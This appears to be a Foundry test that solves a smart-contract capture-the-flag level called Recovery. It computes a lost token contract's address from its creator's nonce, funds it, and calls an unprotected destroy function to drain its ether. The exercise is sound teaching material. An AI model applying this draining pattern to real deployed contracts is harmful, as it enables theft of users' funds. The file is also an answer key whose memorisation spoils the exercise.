// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "instances/17_Recovery.sol";

contract AttackerRecoveryTest is Test {
    function testRecovery() external {
        Recovery recovery = new Recovery();
        recovery.generateToken("TOKEN", 42_000_000);

        address simpleTokenAddress = computeCreateAddress(address(recovery), 1);
        SimpleToken simpleToken = SimpleToken(payable(simpleTokenAddress));

        assertEq(simpleToken.name(), "TOKEN");
        assertEq(address(simpleToken), simpleTokenAddress);

        (bool sent,) = address(simpleToken).call{value: 0.001 ether}("");
        require(sent, "Failed to send Ether");

        assertFalse(address(simpleToken).balance == 0);
        simpleToken.destroy(msg.sender);
        assertTrue(address(simpleToken).balance == 0);
    }
}
